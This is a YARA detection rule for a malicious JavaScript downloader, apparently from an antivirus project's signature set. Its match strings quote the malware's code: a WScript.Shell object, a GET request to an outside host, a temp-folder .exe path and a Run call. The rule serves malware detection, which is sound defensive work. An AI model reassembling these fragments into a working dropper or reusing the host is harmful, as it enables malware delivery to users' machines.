rule sig_20160330_f0ce6234b616e70b605d5b896ab895a7 {
  meta:
    description = "datamaliciousorder - file 20160330_f0ce6234b616e70b605d5b896ab895a7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b95d2227fe8183ea1c6eb84a0bb52ca5e0a3444eba789ddac7426b36cb18ced3"

  strings:
    $s1  = "var SI = function JO() {return WScript[L](\"WScript\"+\".Shell\");}(), BZ = 11;" fullword ascii
    $s2  = "HO[B](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s3  = "function H(DS, H1){RJ = RJ * 1; return DS - H1;};" fullword ascii
    $s4  = "if (HO[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function X() {return SI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5bYmesVwXy.ex\" + \"e\";};" fullword ascii
    $s6  = "function RA(){return E + \"\";};" fullword ascii
    $s7  = "function N() {return ((C0 == true) && (C0 == AJ)) ? 1 : RJ;};" fullword ascii
    $s8  = "function AP(W){SI[\"Run\"](W, RJ, RJ);};" fullword ascii
    $s9  = "function P(){return 22;};" fullword ascii
    $s10 = "function BW()" fullword ascii
    $s11 = "var PV = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (YQ);" fullword ascii
    $s13 = "function KO(){return L;};" fullword ascii
    $s14 = "return H(N0, VI);" fullword ascii
    $s15 = "function A(PQ) {var C = (1, 2, 3, 4, 5, PQ); return C;};" fullword ascii
    $s16 = "var G0 = false;" fullword ascii
    $s17 = "var C0 = false;" fullword ascii
    $s18 = "C0 = true; " fullword ascii
    $s19 = "var AJ = false;" fullword ascii
    $s20 = "AJ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}